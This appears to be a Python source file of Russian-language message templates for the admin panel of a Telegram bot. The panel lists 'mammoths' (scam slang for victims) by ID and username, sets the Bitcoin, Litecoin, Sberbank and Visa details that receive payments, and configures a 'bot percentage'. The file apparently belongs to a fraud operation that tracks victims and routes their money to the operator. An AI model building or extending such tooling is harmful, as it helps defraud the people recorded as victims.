from tg_bot.text.user import service_name

async def start_text_admin():
    return f"""
<b>👋 Добро пожаловать в Админку сервиса {service_name}!</b>
    """

async def not_mammoth_admin():
    """Нет Мамонтов"""
    return """
<b>У вас пока нет Мамонтов!</b>
    """

async def display_mammoth_admin(mammoths):
    """Список всех Мамонтов"""
    amount_mammoth = len(mammoths)
    mammoths = [f'<b>ID</b>: {m[0]} \n<b>Username</b>: @{m[11]}' for m in mammoths]
    mammoths = "\n\n".join(el for el in mammoths)
    return f"""
🦣: <b>{amount_mammoth} мамонтов</b>

<b>Список мамонтов:</b>
{mammoths}
        """

async def my_wallet_admin_menu():
    return """
<b>💼 Кошельки</b>
    """


async def not_wallets_admin():
    """Нет Кошельков"""
    return """
<b>У вас пока не Добавлены Кошельки!</b>
    """


async def show_my_wallets_text(wallets):
    """Список всех Кошельков"""
    wallets = [f'<b>{w[1].capitalize()}</b>: <code>{w[2]}</code>' for w in wallets]
    wallets = "\n".join(el for el in wallets)
    return f"""
{wallets}
        """


async def change_wallet_text_admin(wallet):
    if wallet in ['Bitcoin', 'Litecoin']:
        return f"""
<b>Введите номер {wallet} Кошелька:</b>
        """
    elif wallet in ['Sberbank', 'Visa']:
        return f"""
<b>Введите номер {wallet} Карты:</b>
        """


async def success_change_wallet(wallet):
    if wallet in ['Bitcoin', 'Litecoin']:
        return f"""
<b>✅ Вы успешно изменили номер {wallet} кошелька!</b>
        """
    elif wallet in ['Sberbank', 'Visa']:
        return f"""
<b>✅ Вы успешно изменили номер {wallet} карты!</b>
        """

async def settings_admin_text():
    return """
<b>⚙️ Настройка</b>
        """


async def settings_show_percent_admin_text(percent):
    return f"""
<b>Ваш установленный процент:</b>
<code>{percent}%</code>
    """


async def change_percent_text_admin():
    return f"""
<b>Введите Процент Бота:</b>
    """


async def success_change_percent_admin():
    return """
<b>✅ Вы успешно изменили Процент Бота!</b>
    """